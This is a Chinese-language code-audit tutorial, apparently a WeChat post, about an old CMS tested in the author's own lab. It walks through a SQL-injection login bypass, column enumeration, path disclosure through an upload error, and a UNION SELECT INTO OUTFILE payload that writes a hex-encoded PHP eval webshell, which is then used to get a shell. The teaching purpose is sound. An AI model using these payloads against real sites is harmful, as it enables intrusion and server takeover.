> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/2GSPRzDy19-kj7k9YV_OqQ)

获网安教程

免费 & 进群

![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcphoiceCnjmUWFfEhzNhfgO7iaV9R1C73m3H1q8jd45xJl4GH5ARr4yJ5lqeZuyZ7kd8UEMy2RQJUOA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)  

![](https://mmbiz.qpic.cn/mmbiz_png/b96CibCt70iaaJcib7FH02wTKvoHALAMw4fchVnBLMw4kTQ7B9oUy0RGfiacu34QEZgDpfia0sVmWrHcDZCV1Na5wDQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

  

本文由掌控安全学院 - 君叹投稿

前言：老早以前的 CMS 了，随便看看，源码在附件里，一个挺简单的 CMS, 算是灰盒测试，CMS 在另一台 windows 上搭建，代码在本地审计

#### 1 后台 sql 注入 逻辑绕过登录管理员账户

exp: admin’ or ‘1’=’1

密码任意  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcqedgSDmK2QkpXIamMnvsdY5bS09wmtMc2yofaE5tRfASiasOiaia45iacm0kQF6dSGAjm3teWNfJP1aA/640?wx_fmt=png)

#### 2 代码审计

查看 /amdin/index.php  
这里会加入传参 action=login  
也就是 url 会变成  
/admin/index.php?action=login  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcqedgSDmK2QkpXIamMnvsdYxCCjov9PcibJpxbHyIjtbY0JicUicibz9YDsbW4jDzib1RGPzrBABW8WqHQ/640?wx_fmt=png)

查看本页面并无关于 login 的代码  
查看开头  
包含了当前路径下的 /includes/global.fun.php

![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcqedgSDmK2QkpXIamMnvsdY1LrML12mMv6yz36oVPt2Dz7nC5wftvgdaKZobxptAtstP4ViaicRpzNQ/640?wx_fmt=png)

追踪过去，查看一下内容  
这里有个 switch 语句  
也就是当 action 的值为 login 的时候  
触发函数 function_login()

![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcqedgSDmK2QkpXIamMnvsdYlFnrVQJxdfSK9RExJnneT4O3icPqrpPhu5erCfyicaticMZHqtGhopQLg/640?wx_fmt=png)

追踪函数 function_login()

![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcqedgSDmK2QkpXIamMnvsdYCUpSrT3Z29PJZRVRTpXicmibg4mGf4zVNmp31930qXQG0LWMfLiczWDHg/640?wx_fmt=png)

我们可以看到这里是否能登录成功的标准为这条 sql 语句的返回值是否为 True  
这里使用了单引号闭合

```
select * from magacms_user where username='$username' and password='$password' limit 1
```

结合上我们构造的 payload  
admin’ or ‘1’=’1  
最后的 sql 语句就是

```
select * from magacms_user where username='admin' or '1'='1' and password='md5(1)' limit 1
```

返回值为 True  
可以成功登录后台

#### 3 文件上传部分审计

这里有一个上传提交的功能  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcqedgSDmK2QkpXIamMnvsdYD2d9mkuncSIicfWqYk9yk5sibiasjXwic5PBicj8aslRv5kjFrzTO2aicryQ/640?wx_fmt=png)

尝试文件上传  
可以看到我们这里文件被提交到了 upload.inc.php 文件  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcqedgSDmK2QkpXIamMnvsdYl1fdBfYSicTygrmuwzKRYqScNtlVxEcjSOfWKUB7Hu9xwaKSh99vHkg/640?wx_fmt=png)

查看 upload.inc.php 文件代码  
我们发现这里会对上传文件的 Content-Type 类型进行检测  
并且会将文件后缀名更改为 Content-Type 类型所对应的后缀名

![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcqedgSDmK2QkpXIamMnvsdY9qNNHpfcQPwpicCgt6ibsmREW7y6icnnCMmLwywx89lKXTNQXaCbP0Dsg/640?wx_fmt=png)

但是我们看到开头  
用于判断是否上传了文件的代码  
是检测 get 传参中  
action == upfile

![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcqedgSDmK2QkpXIamMnvsdYRcuvJcVsNZ0zLYkNOiaSeLS4yTSxL1wuzFBvXVBC5LEFdvps1fXLksg/640?wx_fmt=png)

那么如果我们传入 ?action=upfile  
但是不进行文件上传  
代码就会报错  
如果目标服务器没有屏蔽报错的话  
我们就可以得到路径  
利用 SQL 注入写入木马

#### 4 SQL 注入

找到刚刚的万能密码登录点  
尝试猜解字段数  
构造 payload: admin’ order by 1 #

![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcqedgSDmK2QkpXIamMnvsdYX81AXeEpV1kE6IO2aWfSzQS3NIDicL1zXOQDMHvlacOvC1Nic6nbrkibg/640?wx_fmt=png)

报错了，但是成功登录  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcqedgSDmK2QkpXIamMnvsdYfj8qonGSaeibIS3fVric9vV2xvg6xTFTtwDg8PdooaeuxXEBLicuYTAhQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcqedgSDmK2QkpXIamMnvsdYw0jIaOznf5Rt6DuK5abhiblNBzc97HuVFkGHdyuOtfb9TnG3ybXlCUA/640?wx_fmt=png)

payload: admin’ order by 10 #  
依然报错，但是登录失败  
多次测试之后得到字段数为 5

#### 5 写入木马

得到路径  
C:/phpStudy/WWW/  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcqedgSDmK2QkpXIamMnvsdYSw1UyeiciblNbpQSEqSQAoF5TCwqCW6iavzdiaroYAw8criczZ2XhTN2IkA/640?wx_fmt=png)

构造 exp  
先将一句话木马 HEX 编码  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcqedgSDmK2QkpXIamMnvsdYYdELEDIh71YxPvBVooWwzjK5qBfa47gaPek3DENgibc5ianhr4Yjf9cA/640?wx_fmt=png)

exp: admin’ union select 1,2,3,4,0x3c3f706870206576616c28245f524551554553545b27636d64275d293b3f3e into outfile ‘C:/phpStudy/WWW/2.php ‘ — qwe

![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcqedgSDmK2QkpXIamMnvsdYUXEDg8LlfV7wjUBownPmJJlZgdK4uRjlLrta7Yc400APVYicse6GITA/640?wx_fmt=png)

页面提示用户名密码错误

![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcqedgSDmK2QkpXIamMnvsdYCp9pPXNOjFcKCVuDIMj3GsK5U16NzCfLaiaNEaSGWicqwcEWVhJw43dw/640?wx_fmt=png)

访问 2.php  
木马成功生成  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcqedgSDmK2QkpXIamMnvsdYl7WXLiab5FlDyLXjIUPx7ZnhwGcvJDBRQvfJkyN8KetrBMdMhfwp4VQ/640?wx_fmt=png)

用蚁剑连接  
成功 getshell

![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcqedgSDmK2QkpXIamMnvsdY3ZNkDTfR38VZtOwb7eCLBX8VuduVcQmtxq7wUxW8gtia4rkicD67zrQw/640?wx_fmt=png)

#### 如果普通目录没有写入权限，可以尝试一下写入到文件上传的路径

查看一下我们刚才上传的 jpg 文件

![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcqedgSDmK2QkpXIamMnvsdYA0SgJodVp5VoibIibOqkL6XnMibF9N3BuIzDceBYDJia03qktLdticrluHA/640?wx_fmt=png)

拖动图片，到上方标签栏空白处

![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcqedgSDmK2QkpXIamMnvsdYRSC87Tib2fbZj3XpKdN5L2NGicgJwpDozftBpmmMQuYjo52tVjaqChLA/640?wx_fmt=png)

这里就是上传文件的路径

![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcqedgSDmK2QkpXIamMnvsdY5gibNic46Jv2Ma3r5hVQdibZPujjfwOOcRGdqzbjenlEo0jZ7wYEBjjMg/640?wx_fmt=png)

#### 总结

像这种代码根本没办法在密码处注入，因为密码会先被 md5() 函数处理  
完了之后只能是一串字符串了，只能是在用户名处进行注入，再通过代码逻辑进行绕过从而登录后台，其实者应该叫万能用户登录吧？但是登录到的是 admin 用户，问题不大，反正是进去了，然后如果有权限限制，可以试试能不能写入到文件上传对应的那个路径，因为在 WEB 上已经把上传的文件类型限死了，这个 CMS 的文件上传我觉得只能结合文件包含漏洞来用，不太能直接传一个 php 吧，因为他改后缀啊… 如果有大佬能绕也请评论区告知，带带弟弟吧，呜呜。

申明：本公众号所分享内容仅用于网络安全技术讨论，切勿用于违法途径，

所有渗透都需获取授权，违者后果自行承担，与本号及作者无关，请谨记守法.

![](https://mmbiz.qpic.cn/mmbiz_gif/BwqHlJ29vcqJvF3Qicdr3GR5xnNYic4wHWaCD3pqD9SSJ3YMhuahjm3anU6mlEJaepA8qOwm3C4GVIETQZT6uHGQ/640?wx_fmt=gif&wxfrom=5&wx_lazy=1)  

**没看够~？欢迎关注！**

**分享本文到朋友圈，可以凭截图找老师领取**

上千**教程 + 工具 + 交流群 + 靶场账号**哦

![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcphoiceCnjmUWFfEhzNhfgO7iaV9R1C73m3H1q8jd45xJl4GH5ARr4yJ5lqeZuyZ7kd8UEMy2RQJUOA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

 **分享后扫码加我！**

  

**回顾往期内容**

[Xray 挂机刷漏洞](http://mp.weixin.qq.com/s?__biz=MzUyODkwNDIyMg==&mid=2247504665&idx=1&sn=eb88ca9711e95ee8851eb47959ff8a61&chksm=fa6baa68cd1c237e755037f35c6f74b3c09c92fd2373d9c07f98697ea723797b73009e872014&scene=21#wechat_redirect)  

[零基础学黑客，该怎么学？](http://mp.weixin.qq.com/s?__biz=MzUyODkwNDIyMg==&mid=2247487576&idx=1&sn=3852f2221f6d1a492b94939f5f398034&chksm=fa686929cd1fe03fcb6d14a5a9d86c2ed750b3617bd55ad73134bd6d1397cc3ccf4a1b822bd4&scene=21#wechat_redirect)

[网络安全人员必考的几本证书！](http://mp.weixin.qq.com/s?__biz=MzUyODkwNDIyMg==&mid=2247520349&idx=1&sn=41b1bcd357e4178ba478e164ae531626&chksm=fa6be92ccd1c603af2d9100348600db5ed5a2284e82fd2b370e00b1138731b3cac5f83a3a542&scene=21#wechat_redirect)  

[文库｜内网神器 cs4.0 使用说明书](http://mp.weixin.qq.com/s?__biz=MzUyODkwNDIyMg==&mid=2247519540&idx=1&sn=e8246a12895a32b4fc2909a0874faac2&chksm=fa6bf445cd1c7d53a207200289fe15a8518cd1eb0cc18535222ea01ac51c3e22706f63f20251&scene=21#wechat_redirect)  

[代码审计 | 这个 CNVD 证书拿的有点轻松](http://mp.weixin.qq.com/s?__biz=MzUyODkwNDIyMg==&mid=2247503150&idx=1&sn=189d061e1f7c14812e491b6b7c49b202&chksm=fa6bb45fcd1c3d490cdfa59326801ecb383b1bf9586f51305ad5add9dec163e78af58a9874d2&scene=21#wechat_redirect)

[【精选】SRC 快速入门 + 上分小秘籍 + 实战指南](http://mp.weixin.qq.com/s?__biz=MzUyODkwNDIyMg==&mid=2247512593&idx=1&sn=24c8e51745added4f81aa1e337fc8a1a&chksm=fa6bcb60cd1c4276d9d21ebaa7cb4c0c8c562e54fe8742c87e62343c00a1283c9eb3ea1c67dc&scene=21#wechat_redirect)

 [代理池工具撰写 | 只有无尽的跳转，没有封禁的 IP！](http://mp.weixin.qq.com/s?__biz=MzUyODkwNDIyMg==&mid=2247503462&idx=1&sn=0b696f0cabab0a046385599a1683dfb2&chksm=fa6bb717cd1c3e01afc0d6126ea141bb9a39bf3b4123462528d37fb00f74ea525b83e948bc80&scene=21#wechat_redirect)
-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

![](https://mmbiz.qpic.cn/mmbiz_gif/BwqHlJ29vcqJvF3Qicdr3GR5xnNYic4wHWaCD3pqD9SSJ3YMhuahjm3anU6mlEJaepA8qOwm3C4GVIETQZT6uHGQ/640?wx_fmt=gif&wxfrom=5&wx_lazy=1)

点赞 + 在看支持一下吧~ 感谢看官老爷~ 

你的点赞是我更新的动力